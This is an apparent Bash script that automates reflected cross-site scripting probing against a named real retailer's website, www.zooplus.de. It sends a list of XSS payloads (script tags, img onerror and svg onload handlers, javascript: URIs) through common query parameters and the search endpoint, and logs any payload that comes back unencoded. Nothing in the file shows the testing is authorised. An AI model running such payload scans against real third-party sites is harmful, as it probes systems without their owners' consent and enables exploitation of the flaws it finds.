#!/bin/bash

# Quick XSS Testing на основе найденного parameter reflection

TARGET="www.zooplus.de"
OUTPUT="reports/xss_test.txt"

echo "================================================================================"
echo "XSS TESTING (Based on Parameter Reflection Finding)"
echo "================================================================================"

echo "[*] Testing reflected XSS..." | tee "$OUTPUT"

# XSS payloads
PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "'\"><script>alert(1)</script>"
    "javascript:alert(1)"
)

# Test parameters
PARAMS=("test" "q" "search" "query" "redirect" "url" "return" "next")

for param in "${PARAMS[@]}"; do
    echo "" | tee -a "$OUTPUT"
    echo "[*] Testing parameter: $param" | tee -a "$OUTPUT"
    
    for payload in "${PAYLOADS[@]}"; do
        URL="https://$TARGET/?$param=$(echo $payload | jq -sRr @uri)"
        
        RESPONSE=$(curl -s "$URL")
        
        # Check if payload is reflected WITHOUT encoding
        if echo "$RESPONSE" | grep -F "$payload" > /dev/null; then
            echo "  [!!!] XSS FOUND: $param with payload: $payload" | tee -a "$OUTPUT"
            echo "  URL: $URL" | tee -a "$OUTPUT"
        fi
    done
done

# Test search specifically
echo "" | tee -a "$OUTPUT"
echo "[*] Testing search endpoint..." | tee -a "$OUTPUT"

SEARCH_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "\"><img src=x onerror=alert(document.domain)>"
    "<svg/onload=alert(1)>"
)

for payload in "${SEARCH_PAYLOADS[@]}"; do
    URL="https://$TARGET/search?q=$(echo $payload | jq -sRr @uri)"
    
    RESPONSE=$(curl -s "$URL")
    
    if echo "$RESPONSE" | grep -F "<script" > /dev/null; then
        echo "  [!!!] REFLECTED XSS in search!" | tee -a "$OUTPUT"
        echo "  Payload: $payload" | tee -a "$OUTPUT"
        echo "  URL: $URL" | tee -a "$OUTPUT"
    fi
done

echo "" | tee -a "$OUTPUT"
echo "[+] XSS testing complete. Results in: $OUTPUT"

